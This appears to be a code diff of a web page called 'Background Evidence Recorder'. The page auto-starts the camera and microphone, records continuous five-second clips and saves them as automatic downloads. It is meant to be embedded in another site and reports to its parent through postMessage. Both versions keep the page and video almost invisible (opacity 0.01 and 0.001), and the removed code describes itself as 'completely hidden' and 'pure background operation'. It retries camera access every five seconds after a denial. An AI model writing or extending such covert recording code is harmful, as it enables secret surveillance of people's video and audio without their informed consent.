@@ -2,62 +2,139 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- CRITICAL MOBILE META TAGS -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
+    <!-- iOS Video Playback Fixes -->
+    <meta name="apple-mobile-web-app-title" content="Evidence Recorder">
+    
     <title>Background Evidence Recorder</title>
     <style>
-        /* Hide everything - pure background operation */
+        /* MOBILE OPTIMIZED STYLING */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-text-size-adjust: 100%;
+        }
+        
         body {
             margin: 0;
             padding: 0;
-            width: 1px;
-            height: 1px;
+            width: 100vw;
+            height: 100vh;
             overflow: hidden;
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            opacity: 0.001;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background: #000;
+            opacity: 0.01;
+            visibility: visible; /* Important for mobile */
+            touch-action: none;
         }
         
-        /* Minimal status indicator (optional, hidden by default) */
+        /* Hidden video element but properly sized for mobile */
+        #videoPreview {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 320px;
+            height: 240px;
+            object-fit: cover;
+            transform: scaleX(-1);
+            opacity: 0.001;
+            visibility: visible;
+            z-index: -9999;
+            pointer-events: none;
+        }
+        
+        /* Mobile status indicator */
         #statusIndicator {
             position: fixed;
             bottom: 10px;
             right: 10px;
             background: rgba(231, 76, 60, 0.9);
             color: white;
-            padding: 5px 10px;
-            border-radius: 4px;
+            padding: 8px 12px;
+            border-radius: 8px;
             font-size: 12px;
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
             z-index: 999999;
-            display: none; /* Hidden by default */
+            display: block; /* Show for debugging */
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        /* Debug console for mobile */
+        #debugConsole {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.8);
+            color: #0f0;
+            padding: 10px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 11px;
+            max-width: 90%;
+            max-height: 200px;
+            overflow: auto;
+            z-index: 999999;
+            display: block; /* Show for debugging */
+            border: 1px solid #0f0;
         }
     </style>
 </head>
 <body>
-    <!-- Completely hidden video element -->
-    <video id="videoPreview" autoplay muted playsinline style="display: none;"></video>
+    <!-- Video element with MOBILE ATTRIBUTES -->
+    <video id="videoPreview" 
+           autoplay 
+           muted 
+           playsinline 
+           webkit-playsinline>
+    </video>
     
-    <!-- Optional tiny status indicator (can be shown if needed) -->
+    <!-- Status indicator -->
     <div id="statusIndicator">
-        <span id="statusText">🔴 Recording...</span>
-        <span id="clipCount">Clips: 0</span>
+        <span id="statusText">🔄 Initializing...</span>
+        <span id="clipCount"> | Clips: 0</span>
+    </div>
+    
+    <!-- Debug console -->
+    <div id="debugConsole">
+        <div>📱 Mobile Evidence Recorder</div>
+        <div id="debugLog"></div>
     </div>
 
     <script>
+        // ===== MOBILE DEBUG LOGGER =====
+        function debugLog(message) {
+            console.log('📱 Evidence Recorder:', message);
+            const debugLog = document.getElementById('debugLog');
+            if (debugLog) {
+                const time = new Date().toLocaleTimeString();
+                debugLog.innerHTML += `<div>[${time}] ${message}</div>`;
+                debugLog.scrollTop = debugLog.scrollHeight;
+            }
+        }
+
         // ===== CONFIGURATION =====
         const CONFIG = {
             clipDuration: 5000,        // 5 seconds per clip
             autoStartDelay: 1000,      // 1 second delay before starting
             enableAudio: true,         // Record audio
             videoQuality: { 
-                width: 1280, 
-                height: 720,
-                frameRate: 30
+                width: 640,            // Lower resolution for mobile
+                height: 480,
+                frameRate: 15,         // Lower FPS for mobile
+                facingMode: 'environment' // Use back camera
             },
-            maxClips: 100,             // Maximum clips to keep in memory
-            storageKey: 'evidence_recorder_data',
-            showStatusIndicator: false // Set to true to show tiny status
+            maxClips: 100,
+            storageKey: 'evidence_recorder_data'
         };
 
         // ===== STATE =====
@@ -70,64 +147,156 @@
         let recordingsData = [];
         let recorderActive = true;
 
+        // ===== MESSAGE LISTENING =====
+        // CRITICAL: Listen for messages from parent window
+        window.addEventListener('message', async (event) => {
+            debugLog(`Message received: ${event.data.type}`);
+            
+            try {
+                switch (event.data.type) {
+                    case 'startRecording':
+                        debugLog('Start recording command');
+                        await startRecording(event.data.config);
+                        break;
+                        
+                    case 'stopRecording':
+                        debugLog('Stop recording command');
+                        stopRecording();
+                        break;
+                        
+                    case 'MOBILE_HANDSHAKE':
+                        debugLog('Handshake received');
+                        // Send response back
+                        window.parent.postMessage({
+                            type: 'MOBILE_READY',
+                            status: 'ready',
+                            timestamp: Date.now()
+                        }, '*');
+                        break;
+                        
+                    case 'PING':
+                        debugLog('Ping received');
+                        window.parent.postMessage({
+                            type: 'PONG',
+                            timestamp: Date.now()
+                        }, '*');
+                        break;
+                }
+            } catch (error) {
+                debugLog(`Error handling message: ${error.message}`);
+            }
+        });
+
         // ===== INITIALIZATION =====
         window.addEventListener('load', () => {
-            console.log('🔒 Background Evidence Recorder Initializing...');
+            debugLog('🚀 Evidence Recorder Loaded');
+            updateStatus('Loading...');
             
-            // Setup status indicator (optional)
-            if (CONFIG.showStatusIndicator) {
-                document.getElementById('statusIndicator').style.display = 'block';
-            }
+            // Send ready message to parent
+            setTimeout(() => {
+                try {
+                    window.parent.postMessage({
+                        type: 'EVIDENCE_RECORDER_READY',
+                        ready: true,
+                        userAgent: navigator.userAgent,
+                        isMobile: /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
+                    }, '*');
+                    debugLog('Ready message sent to parent');
+                } catch (e) {
+                    debugLog(`Failed to send ready: ${e.message}`);
+                }
+            }, 500);
             
-            // Start the recorder
-            setTimeout(initializeRecorder, CONFIG.autoStartDelay);
-            
-            // Load previous data
+            // Load saved data
             loadSavedData();
+            
+            // Try to start automatically (optional)
+            setTimeout(() => {
+                if (recorderActive) {
+                    debugLog('Auto-initializing...');
+                    initializeRecorder();
+                }
+            }, CONFIG.autoStartDelay);
         });
 
         // ===== CORE FUNCTIONS =====
         async function initializeRecorder() {
             try {
-                updateStatus('Requesting camera access...');
+                updateStatus('Requesting camera...');
+                debugLog('Requesting camera access...');
                 
-                // Request camera and microphone
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: CONFIG.videoQuality,
+                // MOBILE-SPECIFIC CAMERA REQUEST
+                const constraints = {
+                    video: {
+                        facingMode: CONFIG.videoQuality.facingMode,
+                        width: { ideal: CONFIG.videoQuality.width },
+                        height: { ideal: CONFIG.videoQuality.height },
+                        frameRate: { ideal: CONFIG.videoQuality.frameRate }
+                    },
                     audio: CONFIG.enableAudio
-                });
+                };
                 
-                // Set up video element (hidden)
+                debugLog('Constraints: ' + JSON.stringify(constraints));
+                
+                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                debugLog('Camera access granted');
+                updateStatus('Camera ready');
+                
+                // Set up video element
                 const video = document.getElementById('videoPreview');
                 video.srcObject = cameraStream;
                 
-                updateStatus('Camera ready, starting auto-recording...');
+                // CRITICAL for iOS: Play the video
+                video.play().catch(e => {
+                    debugLog(`Video play error: ${e.message}`);
+                });
                 
-                // Start recording loop
+                // Start recording
                 startRecordingLoop();
                 
-                // Save that recorder is active
+                // Save active state
                 localStorage.setItem('recorder_active', 'true');
                 
-            } catch (error) {
-                console.error('Camera access error:', error);
-                updateStatus('Camera denied, retrying in 10s...');
+                // Notify parent
+                window.parent.postMessage({
+                    type: 'RECORDER_ACTIVE',
+                    active: true
+                }, '*');
                 
-                // Try again after delay
-                setTimeout(initializeRecorder, 10000);
+            } catch (error) {
+                debugLog(`Camera error: ${error.name} - ${error.message}`);
+                updateStatus(`Camera error: ${error.name}`);
+                
+                // Send error to parent
+                window.parent.postMessage({
+                    type: 'RECORDER_ERROR',
+                    error: error.message
+                }, '*');
+                
+                // Retry after delay
+                setTimeout(initializeRecorder, 5000);
             }
         }
 
         function startRecordingLoop() {
-            if (!recorderActive || !cameraStream) return;
+            if (!recorderActive || !cameraStream) {
+                debugLog('Cannot start - not active or no stream');
+                return;
+            }
             
-            updateStatus(`Recording clip ${clipCount + 1}...`);
+            updateStatus(`Recording clip ${clipCount + 1}`);
+            debugLog(`Starting clip ${clipCount + 1}`);
             
             try {
+                // Find supported mime type for MOBILE
+                const mimeType = getSupportedMimeType();
+                debugLog(`Using mime type: ${mimeType}`);
+                
                 // Create media recorder
                 mediaRecorder = new MediaRecorder(cameraStream, {
-                    mimeType: 'video/webm;codecs=vp9,opus',
-                    videoBitsPerSecond: 2500000
+                    mimeType: mimeType,
+                    videoBitsPerSecond: 1500000 // Lower bitrate for mobile
                 });
                 
                 recordedChunks = [];
@@ -136,50 +305,83 @@
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data && event.data.size > 0) {
                         recordedChunks.push(event.data);
+                        debugLog(`Chunk received: ${(event.data.size/1024).toFixed(2)}KB`);
                     }
                 };
                 
                 // When recording stops
                 mediaRecorder.onstop = () => {
+                    debugLog('Recording stopped, saving...');
                     saveRecording();
                     
-                    // Start next recording after short delay
+                    // Start next recording
                     if (recorderActive) {
                         setTimeout(startRecordingLoop, 300);
                     }
                 };
                 
                 // Start recording
-                mediaRecorder.start(CONFIG.clipDuration); // Split into 5s chunks
+                mediaRecorder.start(CONFIG.clipDuration);
                 isRecording = true;
+                
+                debugLog(`Recording started for ${CONFIG.clipDuration}ms`);
                 
                 // Auto-stop after clip duration (safety)
                 setTimeout(() => {
                     if (mediaRecorder && isRecording) {
+                        debugLog('Auto-stopping recording...');
                         mediaRecorder.stop();
                         isRecording = false;
                     }
                 }, CONFIG.clipDuration + 1000);
                 
             } catch (error) {
-                console.error('Recording error:', error);
-                updateStatus('Recording error, retrying...');
+                debugLog(`Recording start error: ${error.message}`);
+                updateStatus('Recording error');
+                
+                // Try again
                 setTimeout(startRecordingLoop, 1000);
             }
         }
 
+        function getSupportedMimeType() {
+            // Check mobile-specific mime types
+            const mimeTypes = [
+                'video/webm;codecs=vp9,opus',
+                'video/webm;codecs=vp8,opus',
+                'video/webm;codecs=h264,opus',
+                'video/webm',
+                'video/mp4'
+            ];
+            
+            for (let type of mimeTypes) {
+                if (MediaRecorder.isTypeSupported(type)) {
+                    debugLog(`Supported: ${type}`);
+                    return type;
+                }
+            }
+            
+            // Default fallback
+            return 'video/webm';
+        }
+
         function saveRecording() {
-            if (recordedChunks.length === 0) return;
+            if (recordedChunks.length === 0) {
+                debugLog('No chunks to save');
+                return;
+            }
             
             // Create blob
-            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const blob = new Blob(recordedChunks, { 
+                type: mediaRecorder.mimeType || 'video/webm' 
+            });
             
-            // Generate filename with timestamp
+            // Generate filename
             const now = new Date();
             const timestamp = now.toISOString().replace(/[:.]/g, '-');
             const filename = `evidence_${timestamp}.webm`;
             
-            // Create download link and trigger download
+            // Create download link
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
@@ -187,16 +389,16 @@
             a.style.display = 'none';
             document.body.appendChild(a);
             a.click();
-            document.body.removeChild(a);
-            
-            // Clean up
-            setTimeout(() => URL.revokeObjectURL(url), 1000);
+            setTimeout(() => {
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }, 100);
             
             // Update stats
             clipCount++;
             totalTime += CONFIG.clipDuration / 1000;
             
-            // Save recording info (without blob to save memory)
+            // Save recording info
             recordingsData.unshift({
                 id: Date.now(),
                 filename: filename,
@@ -206,16 +408,71 @@
                 date: now.toLocaleDateString()
             });
             
-            // Limit number of clips in memory
+            // Limit clips
             if (recordingsData.length > CONFIG.maxClips) {
                 recordingsData.pop();
             }
             
-            // Update UI and save data
+            // Update UI and save
             updateStatus();
             saveData();
             
-            console.log(`✅ Clip ${clipCount} saved: ${filename} (${(blob.size/1024/1024).toFixed(2)}MB)`);
+            debugLog(`✅ Clip saved: ${filename} (${(blob.size/1024/1024).toFixed(2)}MB)`);
+            
+            // Notify parent
+            window.parent.postMessage({
+                type: 'CLIP_SAVED',
+                clipCount: clipCount,
+                filename: filename,
+                size: blob.size
+            }, '*');
+        }
+
+        function stopRecording() {
+            debugLog('Stopping recording...');
+            
+            recorderActive = false;
+            if (mediaRecorder && isRecording) {
+                mediaRecorder.stop();
+            }
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            
+            updateStatus('⏹ Stopped');
+            
+            window.parent.postMessage({
+                type: 'RECORDER_STOPPED',
+                clipCount: clipCount,
+                totalTime: totalTime
+            }, '*');
+        }
+
+        async function startRecording(config) {
+            debugLog('Manual start recording called');
+            
+            if (config) {
+                // Update config if provided
+                Object.assign(CONFIG.videoQuality, config.video || {});
+            }
+            
+            recorderActive = true;
+            await initializeRecorder();
+        }
+
+        // ===== STATUS FUNCTIONS =====
+        function updateStatus(message) {
+            const statusEl = document.getElementById('statusText');
+            const countEl = document.getElementById('clipCount');
+            
+            if (statusEl && countEl) {
+                if (message) {
+                    statusEl.textContent = `🔴 ${message}`;
+                } else {
+                    statusEl.textContent = `🔴 Clip ${clipCount + 1}`;
+                }
+                countEl.textContent = ` | Clips: ${clipCount}`;
+            }
         }
 
         // ===== DATA MANAGEMENT =====
@@ -230,7 +487,7 @@
                 
                 localStorage.setItem(CONFIG.storageKey, JSON.stringify(dataToSave));
             } catch (error) {
-                console.error('Save error:', error);
+                debugLog(`Save error: ${error.message}`);
             }
         }
 
@@ -243,128 +500,54 @@
                     totalTime = data.totalTime || 0;
                     recordingsData = data.recordings || [];
                     updateStatus();
+                    debugLog(`Loaded ${clipCount} previous clips`);
                 }
             } catch (error) {
-                // No previous data
+                debugLog('No previous data found');
             }
         }
 
-        // ===== STATUS & API =====
-        function updateStatus(message) {
-            if (CONFIG.showStatusIndicator) {
-                const statusEl = document.getElementById('statusText');
-                const countEl = document.getElementById('clipCount');
-                
-                if (message) {
-                    statusEl.textContent = `🔴 ${message}`;
-                } else {
-                    statusEl.textContent = `🔴 Recording clip ${clipCount + 1}`;
-                }
-                countEl.textContent = ` | Clips: ${clipCount}`;
-            }
-        }
-
-        // ===== PUBLIC API (for your main website) =====
+        // ===== PUBLIC API =====
         window.EvidenceRecorder = {
-            // Get current status
             getStatus: () => ({
                 isActive: recorderActive,
                 clipCount: clipCount,
                 totalTime: totalTime,
                 isRecording: isRecording,
-                lastClip: recordingsData[0] || null
+                lastClip: recordingsData[0] || null,
+                userAgent: navigator.userAgent
             }),
             
-            // Get all recordings
             getRecordings: () => [...recordingsData],
             
-            // Stop recording
             stop: () => {
-                recorderActive = false;
-                if (mediaRecorder && isRecording) {
-                    mediaRecorder.stop();
-                }
-                if (cameraStream) {
-                    cameraStream.getTracks().forEach(track => track.stop());
-                }
-                updateStatus('⏹ Stopped');
+                stopRecording();
                 return 'Recorder stopped';
             },
             
-            // Start recording (if stopped)
-            start: () => {
-                if (!recorderActive) {
-                    recorderActive = true;
-                    initializeRecorder();
-                    return 'Recorder started';
-                }
-                return 'Recorder already running';
+            start: async (config) => {
+                await startRecording(config);
+                return 'Recorder started';
             },
             
-            // Download specific recording
-            downloadClip: (id) => {
-                const clip = recordingsData.find(r => r.id === id);
-                if (clip) {
-                    // This would need server-side implementation
-                    // For now, just trigger latest download
-                    const a = document.createElement('a');
-                    a.href = `#`; // You'd implement server endpoint
-                    a.download = clip.filename;
-                    a.click();
-                    return `Downloading ${clip.filename}`;
-                }
-                return 'Clip not found';
-            },
-            
-            // Clear all recordings
-            clearAll: () => {
-                if (confirm('Clear all evidence recordings?')) {
-                    recordingsData = [];
-                    clipCount = 0;
-                    totalTime = 0;
-                    localStorage.removeItem(CONFIG.storageKey);
-                    updateStatus('Cleared all recordings');
-                    return 'All recordings cleared';
-                }
-                return 'Cancelled';
+            test: () => {
+                debugLog('Test function called');
+                return 'Recorder is working';
             }
         };
 
-        // ===== AUTO-RECOVERY =====
-        // Check if we lost camera and try to recover
-        setInterval(() => {
-            if (recorderActive && cameraStream) {
-                const videoTrack = cameraStream.getVideoTracks()[0];
-                if (videoTrack && videoTrack.readyState === 'ended') {
-                    console.log('Camera lost, attempting recovery...');
-                    updateStatus('Camera lost, recovering...');
-                    initializeRecorder();
-                }
-            }
-        }, 5000);
-
-        // Save data before page closes
-        window.addEventListener('beforeunload', () => {
-            if (recorderActive) {
-                saveData();
-                // Optionally stop recording
-                // window.EvidenceRecorder.stop();
-            }
+        // ===== ERROR HANDLING =====
+        window.addEventListener('error', (event) => {
+            debugLog(`Global error: ${event.message}`);
+            updateStatus(`Error: ${event.message}`);
         });
 
         // ===== INITIAL LOG =====
-        console.log(`
-        ============================================
-        🎥 BACKGROUND EVIDENCE RECORDER
-        ============================================
-        Mode: Headless/Auto-start
-        Clip Duration: ${CONFIG.clipDuration/1000}s
-        Max Clips: ${CONFIG.maxClips}
-        Status: ${CONFIG.showStatusIndicator ? 'Visible indicator' : 'Completely hidden'}
-        
-        Access API via: window.EvidenceRecorder
-        Methods available: getStatus(), stop(), start(), etc.
-        ============================================
+        debugLog(`
+        📱 MOBILE EVIDENCE RECORDER
+        User Agent: ${navigator.userAgent}
+        MediaRecorder: ${window.MediaRecorder ? 'Available' : 'Not Available'}
+        Ready: ${new Date().toLocaleTimeString()}
         `);
     </script>
 </body>
